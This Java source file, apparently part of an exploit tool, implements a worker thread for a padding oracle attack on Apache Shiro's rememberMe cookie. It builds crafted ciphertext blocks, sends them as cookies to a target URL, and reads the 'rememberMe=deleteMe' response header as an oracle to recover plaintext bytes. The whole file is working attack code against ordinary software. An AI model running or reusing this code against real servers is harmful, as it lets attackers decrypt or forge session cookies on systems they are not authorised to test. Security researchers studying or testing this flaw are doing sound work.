package com.longofo;

import org.apache.http.Header;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

import java.io.IOException;
import java.util.Base64;

public class CheckRequestThread extends Thread {

    private final String url;
    private int requestCount;
    private final int index;
    private final int tryTime;
    private Byte resByte;
    private final byte paddingByte;
    private final byte[] preBlock;
    private final byte[] nextCipherTextBlock;
    private final byte[] tmpBLock1;

    private Exception exception = null;

    public CheckRequestThread(String url, int index, byte paddingByte, byte[] preBlock, byte[] nextCipherTextBlock, byte[] tmpBLock1, int tryTime) {
        this.url = url;
        this.requestCount = 0;
        this.index = index;
        this.tryTime = tryTime;
        this.paddingByte = paddingByte;
        this.preBlock = preBlock;
        this.nextCipherTextBlock = nextCipherTextBlock;
        this.tmpBLock1 = tmpBLock1;
        this.resByte = null;
    }

    @Override
    public void run() {
        byte[] tmpBlock2 = ArrayUtil.mergerArray(this.preBlock, this.nextCipherTextBlock);
        byte[] tmpBlock3 = ArrayUtil.mergerArray(this.tmpBLock1, tmpBlock2);
        String rememberMe = Base64.getEncoder().encodeToString(tmpBlock3);
        try {

            for (int i = 0; i < this.tryTime; i++) {
                if (this.checkPaddingAttackRequest(rememberMe)) {
                    this.resByte = (byte) (this.preBlock[this.index] ^ paddingByte);
                    return;
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private boolean checkPaddingAttackRequest(String rememberMe) throws IOException {
        CloseableHttpClient httpClient = HttpClients.createDefault();
        HttpGet httpGet = new HttpGet(this.url);
        CloseableHttpResponse response = null;
        boolean success = true;

        httpGet.addHeader("User-Agent", "Mozilla/5.0");
        httpGet.addHeader("Referer", this.url);
        httpGet.addHeader("Cookie", String.format("rememberMe=%s", rememberMe));

        try {
            response = httpClient.execute(httpGet);
            this.requestCount += 1;
            Header[] headers = response.getAllHeaders();
            if (response.getStatusLine().getStatusCode() == 200) {
                for (Header header : headers) {
                    if (header.getName().equals("Set-Cookie") && header.getValue().contains("rememberMe=deleteMe"))
                        success = false;
                }
            }
        } catch (IOException e) {
//            System.out.println("Request error when checkPaddingAttackRequest: " + e.getMessage());
            e.printStackTrace();
        } finally {
            if (response != null) response.close();
            httpClient.close();
        }
        return success;
    }

    public Byte getResByte() {
        return this.resByte;
    }
}
